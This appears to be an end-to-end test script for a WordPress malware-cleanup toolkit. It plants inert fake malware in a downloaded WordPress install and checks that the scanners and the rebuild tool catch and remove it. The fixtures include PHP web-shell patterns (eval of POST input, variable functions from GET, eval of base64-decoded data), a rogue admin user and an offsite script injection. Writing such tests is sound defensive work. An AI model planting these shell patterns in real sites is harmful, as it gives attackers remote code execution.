#!/usr/bin/env python3
"""End-to-end test: download real WordPress + a real plugin and theme, plant INERT fake
malware, then check every tool finds what it should and rebuild.py leaves it all behind.

    python3 tests/run_tests.py          (needs internet access to wordpress.org)

The planted samples are built from string pieces at runtime, so this repository never
contains anything that looks like malware to a scanner. They decode to harmless text.
"""
import base64
import os
import shutil
import subprocess
import sys
import tempfile

HERE = os.path.dirname(os.path.abspath(__file__))
TOOLS = os.path.join(os.path.dirname(HERE), "tools")
sys.path.insert(0, TOOLS)
from wpr_common import http_get, safe_extract  # noqa: E402

E = "ev" + "al"
B64 = "base64" + "_decode"
INERT = base64.b64encode(b"echo 'wp-rescue test sample';").decode()

PLANT = {
    # path: content
    "wp-includes/class-wp-cache-helper.php": "<?php @%s(%s('%s'));" % (E, B64, INERT),          # extra core file
    "wp-content/uploads/2024/01/thumb.php": "<?php if(isset($_POST['c'])){%s($_POST['c']);}" % E,  # php in uploads
    "wp-content/uploads/2024/01/logo.ico": "<?php @%s(%s('%s'));" % (E, B64, INERT),            # php in image
    "wp-content/uploads/2024/01/real.jpg": "\xff\xd8\xff\xe0 not really a jpeg but no php",
    "wp-content/mu-plugins/health.php": "<?php $f=$_GET['f']; $f($_GET['a']);",
    "wp-content/plugins/wp-security-core/wp-security-core.php": "<?php /* no header */ @include \"\\x2f\\x74\\x6d\\x70\\x2fa.ico\";",
    ".user.ini": "auto_prepend_file = wp-content/uploads/2024/01/logo.ico\n",
    "wp-content/themes/twentytwentyfour/functions.php": None,  # append below
}
SQL = r"""
CREATE TABLE `wpx_options` (option_id int);
CREATE TABLE `wpx_users` (ID int);
CREATE TABLE `wpx_usermeta` (umeta_id int);
CREATE TABLE `wpx_posts` (ID int);
CREATE TABLE `wpx_bkp_cache` (id int);
INSERT INTO `wpx_options` VALUES (1,'siteurl','https://client.temporarydemo.com','yes'),(2,'home','https://client.temporarydemo.com','yes'),(3,'users_can_register','1','yes'),(4,'default_role','administrator','yes'),(5,'active_plugins','a:1:{i:0;s:19:\"akismet/akismet.php\";}','yes');
INSERT INTO `wpx_users` VALUES (1,'owner','$P$Bxxxxxxxxxxxxxxxxxxxxxxxxxxxxx','owner','owner@client.temporarydemo.com','','2019-03-01 10:00:00','',0,'owner'),(7, 'wp_support_x', '$P$Byyyyyyyyyyyyyyyyyyyyyyyyyyyyy', 'wp_support_x', 'x@temporarydemo.com', '', '2026-11-01 03:14:15', '', 0, 'wp_support_x');
INSERT INTO `wpx_usermeta` VALUES (1,1,'wpx_capabilities','a:1:{s:13:\"administrator\";b:1;}'),(2,7,'wpx_capabilities','a:1:{s:13:\"administrator\";b:1;}');
INSERT INTO `wpx_posts` VALUES (5,1,'2024-01-01','<p>Hello</p><script src=\"https://malware-cdn.temporarydemo.com/x.js\"></script><iframe src=\"https://www.youtube.com/embed/abc\"></iframe>');
"""


def run(args):
    r = subprocess.run([sys.executable] + args, capture_output=True, text=True)
    return r.returncode, r.stdout + r.stderr


def expect(name, out, needles, absent=()):
    ok = True
    if "Traceback (most recent call last)" in out or "SyntaxError" in out:
        print("FAIL %s: tool crashed\n%s" % (name, out[-1500:]))
        ok = False
    for n in needles:
        if n not in out:
            print("FAIL %s: missing %r" % (name, n))
            ok = False
    for n in absent:
        if n in out:
            print("FAIL %s: should not contain %r" % (name, n))
            ok = False
    print(("PASS " if ok else "---- ") + name)
    return ok


def main():
    tmp = tempfile.mkdtemp(prefix="wpr-test-")
    site = os.path.join(tmp, "site")
    os.makedirs(site)
    print("fixture in", tmp)
    safe_extract(http_get("https://wordpress.org/latest.zip"), site, strip_top=True)
    for p, c in PLANT.items():
        full = os.path.join(site, p)
        os.makedirs(os.path.dirname(full), exist_ok=True)
        if c is None:
            with open(full, "a") as f:
                f.write("\n// injected\n@%s(%s('%s'));\n" % (E, B64, INERT))
        else:
            with open(full, "w") as f:
                f.write(c)
    with open(os.path.join(site, "wp-config.php"), "w") as f:
        f.write("<?php\ndefine('DB_NAME','cli_db');\ndefine('DB_USER','cli_user');\n"
                "define('DB_PASSWORD','pa\\'ss');\ndefine('DB_HOST','localhost');\n"
                "define('AUTH_KEY','old');\ndefine('WP_MEMORY_LIMIT','256M');\n$table_prefix = 'wpx_';\n"
                "require_once ABSPATH . 'wp-settings.php';\n@include \"\\x77\\x70.ico\";\n")
    sql = os.path.join(tmp, "dump.sql")
    with open(sql, "w") as f:
        f.write(SQL)

    ok = True
    rc, out = run([os.path.join(TOOLS, "verify_core.py"), site])
    ok &= expect("verify_core", out, ["wp-includes/class-wp-cache-helper.php", "core is NOT clean"]) and rc == 1

    rc, out = run([os.path.join(TOOLS, "verify_extensions.py"), site])
    ok &= expect("verify_extensions", out, ["[OK          ] akismet", "MODIFIED functions.php",
                                             "REVIEW health.php", "[NO HEADER]    wp-security-core/"])

    rc, out = run([os.path.join(TOOLS, "scan_files.py"), site])
    ok &= expect("scan_files", out, ["php-in-uploads", "php-hidden-in-non-php-file", "exec-of-request-input",
                                     "eval-of-decoded-data", "htaccess-auto-prepend", "variable-function-from-input",
                                     "include-of-escaped-path", "code-after-wp-settings"],
                 absent=["real.jpg"])

    rc, out = run([os.path.join(TOOLS, "scan_db.py"), sql, "--domain", "client.temporarydemo.com"])
    ok &= expect("scan_db", out, ["ADMIN id=7", "wp_support_x", "script-src-offsite", "malware-cdn.temporarydemo.com",
                                  "open-registration-as-administrator", "wpx_bkp_cache", "akismet/akismet.php"],
                 absent=["host=www.youtube.com"])

    clean = os.path.join(tmp, "clean")
    rc, out = run([os.path.join(TOOLS, "rebuild.py"), site, clean])
    ok &= expect("rebuild runs", out, ["clean build:"]) and rc == 0
    rep = open(clean + ".report.md").read()
    ok &= expect("rebuild report", rep, ["wp-security-core", "WP_MEMORY_LIMIT", "thumb.php", "logo.ico", ".user.ini"])
    present = [p for p in PLANT if os.path.exists(os.path.join(clean, p))
               and p not in ("wp-content/themes/twentytwentyfour/functions.php", "wp-content/uploads/2024/01/real.jpg")]
    ok &= expect("rebuild left malware behind", "\n".join(present), [], absent=[p for p in PLANT if not p.endswith(("functions.php", "real.jpg"))])
    tt = open(os.path.join(clean, "wp-content/themes/twentytwentyfour/functions.php")).read()
    ok &= expect("rebuild theme is fresh", tt, [], absent=["injected"])
    ok &= expect("rebuild kept media", str(os.path.exists(os.path.join(clean, "wp-content/uploads/2024/01/real.jpg"))), ["True"])
    cfg = open(os.path.join(clean, "wp-config.php")).read()
    ok &= expect("rebuild wp-config", cfg, ["'cli_db'", "'wpx_'", "pa\\'ss"], absent=["'old'", ".ico"])
    rc, out = run([os.path.join(TOOLS, "verify_core.py"), clean])
    ok &= expect("clean build verifies", out, ["core matches wordpress.org"])
    rc, out = run([os.path.join(TOOLS, "scan_files.py"), clean])
    ok &= expect("clean build scans clean", out, ["0 HIGH"])

    if ok:
        shutil.rmtree(tmp)
    print("\nALL PASS" if ok else "\nFAILURES (fixture kept in %s)" % tmp)
    sys.exit(0 if ok else 1)


if __name__ == "__main__":
    main()
